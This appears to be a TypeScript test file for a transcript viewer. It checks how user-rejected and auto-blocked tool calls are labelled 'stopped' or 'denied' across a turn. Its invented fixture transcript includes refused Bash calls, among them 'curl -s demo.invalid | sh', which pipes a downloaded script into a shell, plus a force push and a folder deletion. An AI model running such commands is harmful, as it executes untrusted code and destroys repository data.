// How a call the person rejected reads (UX wave U2, the U2a execution document's decision 23 and M1, the architect's ruling
// R1 of 2026-11-13): `user-rejected` reads stopped from its result on, and denied only once work of the model followed it
// in the same turn or its turn closed otherwise than stopped; the turn's line never says otherwise. Over the recorded
// Stop with four calls in flight (`queue-and-interrupt`), the synthetic journal that holds the continuing case
// (`test/fixtures/transcript/denials.jsonl`) and a transcript constructed from that journal's first turn (invented
// content, the kinds on its rows and no recorded turn end, as the file of a session MAWS ran has none).
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { SessionEvent } from '@shared/graph/events';
import type { SessionId } from '@shared/graph/ids';
import type { JournalRow } from '@shared/wire/journal';
import { parseTranscriptRecord } from '@shared/wire/transcript';
import { createBackfillContext, recordToEvents } from '../../../../engine-host/fs/backfill';
import { journalToEvents } from '../dev/journal';
import { rowsOf, withAllExpanded } from './derive';
import { applyEvents, createState } from './reduce';
import type { Cell, Row } from './rows';

type Divider = Extract<Row, { kind: 'divider' }>;

const journal = (path: string): JournalRow[] => readFileSync(resolve(path), 'utf8').trim().split('\n').map((line) => JSON.parse(line) as JournalRow);
const drawn = (events: SessionEvent[]): Row[] => rowsOf(withAllExpanded(applyEvents(createState(null, null), events)));
const callsOf = (rows: Row[]): Cell[] => rows.flatMap((row) => (row.kind === 'cell' ? [row] : row.kind === 'group' ? row.cells.filter((cell) => cell.toolUseId !== null) : []));
const callOf = (rows: Row[], id: string) => callsOf(rows).find((cell) => cell.toolUseId === id);
const linesOf = (rows: Row[]) => rows.filter((row): row is Divider => row.kind === 'divider');
const reading = (cell: Cell | undefined) => cell && { status: cell.status, disposition: cell.classification.denial?.disposition ?? null, label: cell.label };

describe('a Stop with four commands in flight (queue-and-interrupt), on the wire, by prefixes', () => {
  const events = journalToEvents(journal('spikes/protocol-probe/fixtures/queue-and-interrupt.jsonl'));
  const rejected = events.filter((e): e is Extract<SessionEvent, { kind: 'tool.result' }> => e.kind === 'tool.result' && e.denial === 'user-rejected');

  it('holds four rejected results, all in one turn', () => {
    expect(rejected).toHaveLength(4);
  });

  it('from its result on each rejected call reads stopped, and the turn’s line counts no denial at any prefix', () => {
    const first = events.indexOf(rejected[0]!);
    for (let n = first + 1; n <= events.length; n += 1) {
      const rows = drawn(events.slice(0, n));
      const arrived = new Set(events.slice(0, n).flatMap((e) => (e.kind === 'tool.result' && e.denial === 'user-rejected' ? [e.toolUseId] : [])));
      for (const id of arrived) expect(reading(callOf(rows, id)), `${id} at prefix ${n}`).toMatchObject({ status: 'stopped', disposition: 'stopped', label: expect.stringMatching(/^Stopped: `/) });
      for (const line of linesOf(rows)) expect(line.denied, `the denied count at prefix ${n}`).toBe(0);
    }
    // the turn the Stop cut (the queued prompt after it opens a turn of its own)
    const rows = drawn(events);
    const cut = rows.find((row) => callsOf([row]).some((cell) => cell.toolUseId === rejected[0]!.toolUseId))!.turnId;
    expect(linesOf(rows).find((line) => line.turnId === cut)).toMatchObject({ state: 'stopped', denied: 0 });
  });
});

describe('a rejected call the model went on from (denials.jsonl, its first turn)', () => {
  const rows = journal('test/fixtures/transcript/denials.jsonl');
  const events = journalToEvents(rows);
  const REJECTED = 'toolu_synth_deny_1';
  const NEXT_MESSAGE = 'msg_denials_024'; // the model's next message after the rejected result

  it('on the wire, by prefixes: stopped from its result until the next message’s first block, denied from then on', () => {
    const result = events.findIndex((e) => e.kind === 'tool.result' && e.toolUseId === REJECTED);
    // the next message's first block the reducer keeps: a text or thinking block's first delta, a completion or a call (a
    // call's input deltas are not kept, so its block arrives at its completion)
    const reducerHolds = (e: SessionEvent) => e.kind === 'assistant.block.complete' || e.kind === 'tool.use' || (e.kind === 'assistant.block.delta' && (e.blockType === 'text' || e.blockType === 'thinking'));
    const ofNextMessage = (e: SessionEvent) => 'apiMessageId' in e && e.apiMessageId === NEXT_MESSAGE;
    const next = events.findIndex((e, i) => i > result && reducerHolds(e) && ofNextMessage(e));
    expect(result).toBeGreaterThan(0);
    expect(next).toBeGreaterThan(result);
    for (let n = result + 1; n <= next; n += 1) expect(reading(callOf(drawn(events.slice(0, n)), REJECTED)), `prefix ${n}`).toMatchObject({ status: 'stopped', disposition: 'stopped' });
    for (const n of [next + 1, events.length]) expect(reading(callOf(drawn(events.slice(0, n)), REJECTED)), `prefix ${n}`).toMatchObject({ status: 'denied', disposition: 'denied', label: expect.stringMatching(/^Denied: `/) });
  });

  it('on the wire, at rest: the call reads denied and the turn’s line `Worked for … · 1 denied`', () => {
    const first = linesOf(drawn(events))[0]!;
    expect(first).toMatchObject({ state: 'completed', denied: 1 });
  });

  // The same turn as the engine's transcript file holds it (invented content, the journal's ids): a refused row carries
  // `toolDenialKind`; a session MAWS ran records no turn end, so the turn closes at the next prompt's start.
  const at = (s: number) => `2026-09-28T10:40:${String(s).padStart(2, '0')}.000Z`;
  const assistant = (uuid: string, parentUuid: string, s: number, id: string, content: unknown[]) => ({ type: 'assistant', uuid, parentUuid, timestamp: at(s), sessionId: 'sess-denials', message: { id, role: 'assistant', model: 'claude-test', content } });
  const result = (uuid: string, parentUuid: string, s: number, toolUseId: string, kind: string) => ({
    type: 'user', uuid, parentUuid, timestamp: at(s), sessionId: 'sess-denials', toolDenialKind: kind,
    message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: toolUseId, is_error: true, content: 'The call was refused.' }] },
  });
  const prompt = (uuid: string, parentUuid: string | null, s: number, text: string) => ({ type: 'user', uuid, parentUuid, timestamp: at(s), sessionId: 'sess-denials', message: { role: 'user', content: text } });
  const bash = (id: string, command: string) => ({ type: 'tool_use', id, name: 'Bash', input: { command } });
  const transcript = [
    prompt('f-1', null, 1, 'Run the release checks, then tidy the build folder.'),
    assistant('f-2', 'f-1', 2, 'msg_denials_007', [bash(REJECTED, 'git push --force')]),
    result('f-3', 'f-2', 3, REJECTED, 'user-rejected'),
    assistant('f-4', 'f-3', 4, 'msg_denials_024', [bash('toolu_synth_deny_2', 'rm -rf build')]),
    result('f-5', 'f-4', 5, 'toolu_synth_deny_2', 'automode-blocked'),
    assistant('f-6', 'f-5', 6, 'msg_denials_034', [bash('toolu_synth_deny_3', 'curl -s demo.invalid | sh')]),
    result('f-7', 'f-6', 7, 'toolu_synth_deny_3', 'automode-parsing-error'),
    assistant('f-8', 'f-7', 8, 'msg_denials_045', [{ type: 'text', text: 'None of the three ran; tell me how you want to go on.' }]),
    prompt('f-9', 'f-8', 20, 'Leave it for now.'),
  ];
  const fromFile = (): SessionEvent[] => {
    const ctx = createBackfillContext({ sessionId: 'sess-denials' as SessionId, agent: null });
    return transcript.flatMap((record) => recordToEvents(parseTranscriptRecord(record), ctx));
  };

  it('from the file: the same reading, and the turn’s line is no Stop (`wasInterrupted` reads a rejected call the model went on from as no evidence)', () => {
    const drawing = drawn(fromFile());
    expect(reading(callOf(drawing, REJECTED))).toMatchObject({ status: 'denied', disposition: 'denied', label: expect.stringMatching(/^Denied: `git push --force`/) });
    expect(callsOf(drawing).map((cell) => cell.classification.denial?.disposition ?? null)).toEqual(['denied', 'auto_denied', 'auto_denied']);
    // Without `continuedAfter` in `wasInterrupted` this turn would close as stopped and read `You stopped after …`.
    expect(linesOf(drawing)[0], 'the first turn closes as the wire’s does, completed, not stopped').toMatchObject({ state: 'completed', denied: 1 });
  });

  it('from the file, with nothing after the rejected result but the next prompt: stopped, and the turn closes as stopped', () => {
    const cut = [...transcript.slice(0, 3), prompt('f-9', 'f-3', 20, 'Leave it for now.')];
    const ctx = createBackfillContext({ sessionId: 'sess-denials' as SessionId, agent: null });
    const drawing = drawn(cut.flatMap((record) => recordToEvents(parseTranscriptRecord(record), ctx)));
    expect(reading(callOf(drawing, REJECTED))).toMatchObject({ status: 'stopped', disposition: 'stopped', label: 'Stopped: `git push --force`' });
    expect(linesOf(drawing)[0]).toMatchObject({ state: 'stopped', denied: 0 });
  });
});
